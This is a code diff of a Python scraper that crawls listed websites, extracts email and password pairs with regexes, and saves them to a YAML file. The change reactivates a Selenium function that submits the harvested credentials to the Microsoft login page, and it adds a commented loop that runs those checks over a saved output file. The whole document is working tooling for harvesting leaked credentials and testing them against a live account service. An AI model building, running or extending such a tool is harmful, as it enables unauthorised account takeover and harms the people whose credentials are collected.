@@ -16,7 +16,7 @@ option.add_argument("start-maximized")
 
 launchTime = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
 
-with open("settings.yml") as s: settings = yaml.safe_load(s)
+with open("settings.yml") as file: settings = yaml.safe_load(file)
 
 exceptions = settings["exceptions"]
 
@@ -30,12 +30,18 @@ releaseDateYears = releaseDate["years"]
 
 websitesList = settings["websites_list"]
 
-s.close()
+file.close()
 
 microsoftLoginUrl = "https://login.live.com/ppsecure/secure.srf"
 
 emailRegex = r"\S+@\S+\.\S+"
 passwordRegex = r"(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}"
+
+outputExample = {
+    "url": [],
+    "login": [],
+    "password": []
+}
 
 def progress_bar(current : int, total : int) -> None:
     percent = 100 * current/total
@@ -43,7 +49,6 @@ def progress_bar(current : int, total : int) -> None:
 
     print(f"\r{round_percent*"█"+(100-round_percent)*"#"} [{percent:.2f}%]", end="\r")
 
-"""
 def microsoft_check(data : list[str]) -> bool:
     driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=option)
     driver.get(microsoftLoginUrl)
@@ -62,7 +67,7 @@ def microsoft_check(data : list[str]) -> bool:
     except:
         return True
     driver.close()
-"""
+
 
 def check_url(url : str) -> None:
     page = requests.get(url)
@@ -80,17 +85,21 @@ def parse(url : str, soup : BeautifulSoup) -> None:
         login = re.findall(emailRegex, current)
         if login and login[0] not in exceptions:
             password = website_text[i+1].split()[-1] if re.findall(passwordRegex, website_text[i+1]) else website_text[i+2]
-            write_file([url, login[0], password])
+            output(url, login[0], password)
             break
 
-def write_file(values : list[str]) -> None:
-    for value in values:
-        logFile.write(value+"\n")
-        logFile.flush()
+def output(url : str, login : str, password : str) -> None:
+    with open(f"output-{launchTime}.yaml", "r") as file:
+        outputData = yaml.safe_load(file)
+        outputData["url"].append(url)
+        outputData["login"].append(login)
+        outputData["password"].append(password)
+    with open(f"output-{launchTime}.yaml", "w") as file:
+        yaml.dump(outputData, file)
 
 def main():
-    global logFile
-    logFile = open(f"{launchTime}.txt", "w+")
+    outputFile = open(f"output-{launchTime}.yaml", "w")
+    yaml.dump(outputExample, outputFile)
 
     counter = 1
     for month in range(1, 13):
@@ -104,9 +113,15 @@ def main():
                 progress_bar(counter, 366*offsetValue)
                 counter += 1
 
-    logFile.close()
-    os.rename(f"{launchTime}.txt", f"{launchTime}_complete.txt")
-    print(f"\nSuccessfull complete! >> {launchTime}_complete.txt")
+    """
+    with open("output-15-05-2024-14-34-30.yaml", "r") as file:
+        microsoftData = yaml.safe_load(file)
+        for i in range(len(microsoftData["password"])):
+            microsoft_check([microsoftData["login"][i], microsoftData["password"][i]])
+    """
+
+    os.rename(f"output-{launchTime}.yaml", f"output-{launchTime}-complete.yaml")
+    print(f"\nSuccessfull complete! >> output-{launchTime}-complete.yaml")
 
 if __name__ == "__main__":
     main()
